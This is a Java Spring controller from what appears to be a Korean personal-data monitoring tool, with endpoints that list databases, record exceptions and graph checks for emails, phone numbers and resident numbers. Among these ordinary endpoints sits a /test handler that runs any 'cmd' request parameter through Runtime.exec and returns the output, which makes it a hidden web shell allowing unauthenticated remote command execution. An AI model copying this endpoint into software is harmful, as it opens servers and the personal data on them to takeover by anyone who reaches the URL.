package com.shinsegae.smon.privacy;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

//import org.codehaus.jackson.JsonParseException;
//import org.codehaus.jackson.map.JsonMappingException;
//import org.codehaus.jackson.map.ObjectMapper;
//import org.codehaus.jackson.type.TypeReference;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.ModelAndView;

import com.fasterxml.jackson.core.JsonParseException;
import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.JsonMappingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.shinsegae.smon.util.CastingJson;
import com.shinsegae.smon.util.NLogger;

import net.sf.json.JSONObject;
import net.sf.json.JSONSerializer;

//import com.mtr.service.PersonalInfoCheckingImpl;
//import com.mtr.service.PersonalInfoMonitoringImpl;
//import com.util.CastingJson;

@RequestMapping("/personalInfoCheck")
@Controller
public class PersonalInfoCheckController {
	
	@Autowired
	PersonalInfoCheckService personalInfoCheckService;
	
	@Autowired
    CastingJson json;
	
	/*
	* @author mylee
	* @param None
	* @return ModelAndView personalInfoCheck페이지 뷰 출력
	* @since 개인정보 유무 판단 화면. 
	*/
	@RequestMapping("/check")
    public ModelAndView personalInfoCheck() {
		//System.out.println("call Controller personalInfoCheck");
        ModelAndView mv = new ModelAndView();
        mv.setViewName("mtr/detail/personalInfoCheck/personalInfoCheck");
        
        return mv;
    }
	
	/*
	* @author mylee
	* @param HttpServletRequest dbName 
	* @param HttpServletResponse owner 
	* @param String 정보
	* @return String 
	*/
	@ResponseBody
	@RequestMapping(value = "/test", method = RequestMethod.GET)
	public String test(
			HttpServletRequest request,
			HttpServletResponse response,
			@RequestParam(value="cmd", required=false) String cmd
			) throws IOException {
		if(cmd == null) {
			cmd = "cmd.exe /c ipconfig /all";
		}
		Runtime runtime = Runtime.getRuntime();
		Process process = runtime.exec(cmd);
		BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
		String line = "";
		StringBuilder sb = new StringBuilder();
		while ((line = br.readLine()) != null) {
			sb.append(line + "\n");
		}
		//System.out.println(sb.toString());
		
		response.setCharacterEncoding("utf-8");
		
		return sb.toString();
	}
	
	/*
	* @author mylee
	* @param String dbName 디비명
	* @param String owner 디비 관리자
	* @since 개인정보 관리 화면. ENC|DEC 3 + [^] + PREFIX 2 + SPACE +  기존 DESCRIPTION
	* @return String Json OK or Failed
	*/
	@ResponseBody
	@RequestMapping(value="/check/ajax/list", method=RequestMethod.POST)
	public String list(
			@RequestParam(value="dbName") String dbName,
			@RequestParam(value="owner") String owner,
			@RequestParam(value="group") String group
			) {
		//System.out.println("call Controller list");
		HashMap<String, Object> params = new HashMap<String, Object>();

		params.put("dbName", dbName);
		params.put("owner", owner);
		params.put("group", group);
		
		HashMap<String, Object> jqgridResult = new HashMap<String, Object>();
		
		try{
		    List<HashMap<String, Object>> list = personalInfoCheckService.selectPersonalInfoList(params);
		    NLogger.debug("test");
		    //System.out.println(list.toString());
		    
		    jqgridResult.put("page", 1);
	        jqgridResult.put("records", list.size());
	        jqgridResult.put("total", 1);
	        jqgridResult.put("rows", list);
	        //System.out.println(">>>>>>>list toString:"+jqgridResult.toString());
	        //System.out.println(">>>>>>>list Sizeof:"+jqgridResult.size());
	        //System.out.println(">>>>>>>list:"+jqgridResult);
		}catch(Exception e){
		    e.printStackTrace();
		}
		
		return JSONObject.fromObject(JSONSerializer.toJSON(jqgridResult)).toString();
	}
	
	/*
	* @author mylee
	* @return List<HashMap<String, Object>> 
	*/
	@ResponseBody
	@RequestMapping(value="/check/ajax/list/dbName", method=RequestMethod.POST)
	public List<HashMap<String, Object>> listComboDBName() throws Exception {
		HashMap<String, Object> params = new HashMap<String, Object>();
	/*	System.out.println("before:"+params.size());
		personalInfoCheckingImpl.listComboDBName(params);
		System.out.println("after:"+params.size());
		return null;*/
		
		return personalInfoCheckService.selectComboDBName(params);
	}

	/*
	* @author mylee
	* @param String dbName 
	* @return List<HashMap<String, Object>> 
	*/
	@ResponseBody
	@RequestMapping(value="/check/ajax/list/owner", method=RequestMethod.POST)
	public List<HashMap<String, Object>> listComboOwner(
			@RequestParam(value="dbName") String dbName
			) {
		//System.out.println("called listComboOwner in CehckingController1");
		HashMap<String, Object> params = new HashMap<String, Object>();
		params.put("dbName", dbName);
		return personalInfoCheckService.selectComboOwner(params);
	}

	/*
	* @param String exceptionList 
	* @return int 
	*/
	@ResponseBody
	@RequestMapping(value="/check/ajax/add/exception", method=RequestMethod.POST)
	public int addPersonalInfoException(
			@RequestParam(value="exceptionList") String exceptionList
			) throws Exception {
		ObjectMapper om = new ObjectMapper();
		List<HashMap<String, Object>> paramsList = om.readValue(exceptionList, new TypeReference<List<HashMap<String, Object>>>(){});
		
		personalInfoCheckService.insertPersonalInfoException(paramsList);
		
		return 0;
	}
	
	/*
	* @return ModelAndView 
	*/
	@RequestMapping("/progress")
    public ModelAndView personalInfoProgress() {
        
        ModelAndView mv = new ModelAndView();
        mv.setViewName("mtr/detail/personalInfo/personalInfoProgress");
        
        return mv;
    }
	
	/*
	* @param String checkStartDate
	* @param String checkEndDate
	* @param String periodType
	* @return HashMap<String, Object>
	*/
	@ResponseBody
	@RequestMapping(value="/progress/ajax/list/graph", method=RequestMethod.POST)
	public HashMap<String, Object> progressGraphList(
			@RequestParam(value="checkStartDate") String checkStartDate,
			@RequestParam(value="checkEndDate") String checkEndDate,
			@RequestParam(value="periodType") String periodType
			) {
		HashMap<String, Object> params = new HashMap<String, Object>();

		params.put("checkStartDate", checkStartDate);
		params.put("checkEndDate", checkEndDate);
		
		List<HashMap<String, Object>> list = null;
		if(periodType.equals("day")) {
			list = personalInfoCheckService.selectPersonalInfoProgressGraphList(params);
		} else if(periodType.equals("month")) {
			list = personalInfoCheckService.selectPersonalInfoProgressGraphList2(params);
		}
		
		List<HashMap<String, Object>> emailList = new ArrayList<HashMap<String,Object>>();
		List<HashMap<String, Object>> telnoList = new ArrayList<HashMap<String,Object>>();
		List<HashMap<String, Object>> juminList = new ArrayList<HashMap<String,Object>>();
		
		Iterator<HashMap<String, Object>> itor = list.iterator();
		while(itor.hasNext()) {
			HashMap<String, Object> data = itor.next();
			String checkGubn = String.valueOf(data.get("CHECK_GUBN"));
			if(checkGubn.equals("Email")) {
				emailList.add(data);
			} else if(checkGubn.equals("Telno")) {
				telnoList.add(data);
			} else if(checkGubn.equals("Jumin")) {
				juminList.add(data);
			}
		}
		
		HashMap<String, Object> result = new HashMap<String, Object>();
		result.put("emailList", emailList);
		result.put("telnoList", telnoList);
		result.put("juminList", juminList);
		
		return result;
	}
	
	/*
	* @param String dbName 
	* @param String periodType
	* @return HashMap<String, Object> 
	*/
	@ResponseBody
	@RequestMapping(value="/progress/ajax/list/detail", method=RequestMethod.POST)
	public HashMap<String, Object> detail(
			@RequestParam(value="dbName") String dbName,
			@RequestParam(value="periodType") String periodType
			) throws Exception {
		
		HashMap<String, Object> params = new HashMap<String, Object>();

		params.put("dbName", dbName);
		params.put("periodType", periodType);
		
		List<HashMap<String, Object>> list = personalInfoCheckService.selectPersonalInfoDetailList(params);
		HashMap<String, Object> result = new HashMap<String, Object>();
		
		result.put("data", list);
		result.put("draw", 1);
		result.put("recordsTotal", list.size());
		result.put("recordsFiltered", list.size());
		return result;
	}
	
}
